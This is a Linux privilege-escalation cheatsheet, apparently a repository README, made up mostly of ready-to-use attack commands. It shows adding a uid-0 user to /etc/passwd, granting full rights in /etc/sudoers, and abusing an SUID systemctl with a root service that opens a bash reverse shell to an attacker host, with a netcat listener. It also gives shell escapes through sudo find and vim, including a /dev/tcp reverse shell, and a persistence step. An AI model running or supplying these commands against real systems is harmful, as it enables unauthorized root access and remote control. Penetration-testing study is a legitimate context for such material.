# 🐧 LInux-Privilege-Escalation
Linux Privilege Escalation Cheatsheet

## Edit /etc/passwd File
For this you need to have write permission on the /etc/passwd file

### Create Encrypted Password and Salt
```
openssl passwd -1 -salt <username> <password>
```
### Add The Password To /etc/passwd
```
sudo nano /etc/passwd

<username>:<hashed password>:0:0:,,,:/home/nikki:/bin/bash
```

### Login As The New User
```
su <username>
```


## Edit Sudoers File
For this you need to have write permission on the /etc/sudoers

```
sudo nano /etc/sudoers

Add a new user in the User privilege specification section

<username> ALL=(ALL:ALL) ALL
```

### Switch To The New User
```
su <username>

sudo -i
```


## Systemctl - SUID Binary

### Find The SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
### Locate Service Files
```
locate .service

cat /usr/lib/systemd/system/udev.service
```
### Define Your Own Service
```
cd /tmp

nano shell.service
```
***shell.service***
```
[Unit]
Description=reverse shell

[Service]
User=root
ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/<attacker ip>/<attacker port> 0>&1'
```
### Setup The Listener
```
nc -vlp 1234
```
### Enable Shell.service File
```
/usr/bin/systemctl enable /temp/shell.service
```
### Start The Service
```
/usr/bin/systemctl start shell
```

***You Should Get the Root Shell On The Attacker Machine***


## Find Command
```
sudo -l
```

***Create a file called sample***

```
/usr/bin/find sample -exec whoami \;

sudo /usr/bin/find sample -exec bash -i \;

sudo find sample -exec bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1 \;
```


## Vim Command
```
sudo -l
```
### Non Persistence Method
```
sudo vim

:set shell=/bin/bash
:shell
```
### Persistence Method
```
sudo vim /etc/sudoers

In the User privilege specification section
<username> ALL=(ALL:ALL) ALL
```


